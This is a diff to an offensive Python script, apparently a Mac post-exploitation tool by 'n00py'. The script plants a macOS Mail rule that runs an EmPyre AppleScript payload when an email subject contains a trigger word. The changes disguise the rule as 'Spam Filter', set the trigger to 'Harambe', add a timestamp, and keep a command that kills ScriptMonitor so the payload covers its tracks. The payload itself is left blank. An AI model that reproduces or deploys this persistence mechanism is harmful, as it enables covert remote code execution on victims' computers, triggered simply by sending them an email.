@@ -1,17 +1,21 @@
 import os
+from time import time
 from random import choice
 from string import ascii_uppercase
 __author__ = 'Esteban Rodriguez (n00py)'
 
 #Enter a string that you would like the rule to be named
-ruleName = "Test"
+ruleName = "Spam Filter"
 #Enter the 'trigger' word; This will need to be present in the subject line to execute the payload
-trigger = "n00py"
+trigger = "Harambe"
 
 #Paste the applescript here
 #NOTE: When copying the applescript from EmPyre make sure you escape the backslashes twice!  Also remove the last double quote.
 payload =  '''
 '''
+
+#-------------------------------------END OF USER DEFINED PARAMETERS-------------------------------------#
+
 #This makes the applescript kill itself after the python payload is executed
 payload += 'kill `ps -ax | grep \\"ScriptMonitor\\" |grep -v \\"grep\\" |  cut -d \\" \\" -f 1`"'
 
@@ -23,6 +27,8 @@ def UUID():
     return ''.join([choice(hex) for x in range(8)]) + "-" + ''.join([choice(hex) for x in range(4)]) + "-" + ''.join([choice(hex) for x in range(4)]) + "-" + ''.join([choice(hex) for x in range(4)]) + "-" + ''.join([choice(hex) for x in range(12)])
 CriterionUniqueId  = UUID()
 RuleId  = UUID()
+#Set timestamp
+TimeStamp =str(int(time()))[0:9]
 #Creates random filenames
 SyncedRules = "/tmp/" + ''.join(choice(ascii_uppercase) for i in range(12))
 RulesActiveState = "/tmp/" + ''.join(choice(ascii_uppercase) for i in range(12))
@@ -71,7 +77,7 @@ plist = '''<?xml version="1.0" encoding="UTF-8"?>
 		<key>ShouldTransferMessage</key>
 		<string>NO</string>
 		<key>TimeStamp</key>
-		<integer>466421321</integer>
+		<integer>''' + TimeStamp + '''</integer>
 		<key>Version</key>
 		<integer>1</integer>
 	</dict>
